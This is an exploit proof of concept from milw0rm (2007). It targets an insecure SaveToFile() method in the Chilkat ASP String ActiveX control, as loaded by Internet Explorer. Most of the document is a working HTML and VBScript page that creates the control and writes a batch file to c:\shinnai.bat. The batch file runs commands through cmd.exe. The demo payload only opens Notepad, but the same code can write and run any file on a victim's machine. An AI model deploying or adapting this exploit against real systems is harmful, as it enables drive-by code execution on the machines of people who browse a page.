<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
 <b>CHILKAT ASP String (CkString.dll <= 1.1) "SaveToFile()" Inscure Method</b>
 url: http://www.chilkatsoft.com/

 author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 This was written for educational purpose. Use it at your own risk.
 Author will be not be responsible for any damage.

 Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
 all software that use this ocx are vulnerable to this exploits.

 <b>This control is marked as:
 RegKey Safe for Script: False
 RegKey Safe for Init: False
 Implements IObjectSafety: True
 IDisp Safe: Safe for untrusted: caller, data
 IPersist Safe: Safe for untrusted: caller, data
 IPStorage Safe: Safe for untrusted: caller, data</b>
-----------------------------------------------------------------------------

<object classid='clsid:90E567DA-5E79-4571-AB07-7A397FFBE995' id='test'></object>

<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">

<script language='vbscript'>
 Sub tryMe
  Dim mStr
  Dim MyMsg
   mStr = "echo off" & vbCrLf & _
          "cls" & vbCrLf & _
          "echo Hello World!" & vbCrLf & _
          "cmd.exe /c notepad.exe" & vbCrLf & _
          "pause"

   test.str = mStr
   test.SaveToFile ("c:\shinnai.bat"),"big5"
   MyMsg = MsgBox("Exploit completed!")
 End Sub
</script>
</span></span>

</code></pre>

# milw0rm.com [2007-08-05]